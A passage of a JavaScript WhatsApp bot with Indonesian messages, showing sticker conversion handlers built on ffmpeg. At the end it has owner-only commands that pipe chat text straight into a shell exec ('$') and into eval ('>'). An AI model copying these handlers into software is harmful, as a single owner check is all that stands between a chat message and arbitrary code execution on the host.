.save(ran)
} else if ((isMedia && mek.message.videoMessage.seconds < 11 || isQuotedVideo && mek.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.seconds < 11) && args.length == 0) {
const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
const media = await Aikko.downloadAndSaveMediaMessage(encmedia)
ran = '999.webp'
reply(mess.wait)
await ffmpeg(`./${media}`)
.inputFormat(media.split('.')[1])
.on('start', function (cmd) {
console.log(`Started : ${cmd}`)
})
.on('error', function (err) {
console.log(`Error : ${err}`)
fs.unlinkSync(media)
tipe = media.endsWith('.mp4') ? 'video' : 'gif'
reply(`Gagal, pada saat mengkonversi ${tipe} ke stiker`)
})
.on('end', function () {
console.log('Finish')
Aikko.sendMessage(from, fs.readFileSync(ran), sticker, {quoted: mek})
fs.unlinkSync(media)
fs.unlinkSync(ran)
})
.addOutputOptions([`-vcodec`, `libwebp`, `-vf`, `scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
.toFormat('webp')
.save(ran)
} else {
reply(`Kirim gambar dengan caption ${prefix}sticker\nDurasi Sticker Video 1-9 Detik`)
}
break
case 'toimg':
if (!isQuotedSticker) return reply('reply stickernya')
encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
media = await Aikko.downloadAndSaveMediaMessage(encmedia)
ran = getRandom('.png')
exec(`ffmpeg -i ${media} ${ran}`, (err) => {
fs.unlinkSync(media)
if (err) return reply('Gagal, pada saat mengkonversi sticker ke gambar')
buffer = fs.readFileSync(ran)
Aikko.sendMessage(from, buffer, image, {quoted: mek, caption: 'Nih'})
fs.unlinkSync(ran)
})
break
default:
if (isOwner) {
if (budy.startsWith('$')){
if (!mek.key.fromMe && !isOwner) return
qur = budy.slice(2)
exec(qur, (err, stdout) => {
if (err) return reply(`${err}`)
if (stdout) {
reply(stdout)
}
})
}
if (isOwner) {
if (budy.startsWith('>')) {
console.log(color('[ EVAL ]'), color(moment(mek.messageTimestamp * 1000).format('DD/MM/YY HH:mm:ss'), 'yellow'), color(`eval return`))
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
reply(`${evaled}`)
} catch (err) {
reply(`${err}`)
}
}
}
}
}
	} catch (e) {
    e = String(e)
    if (!e.includes("this.isZero") && !e.includes("jid")) {
	console.log('Error : %s', color(e, 'red'))
        }
	// console.log(e)
	}
}


	
    
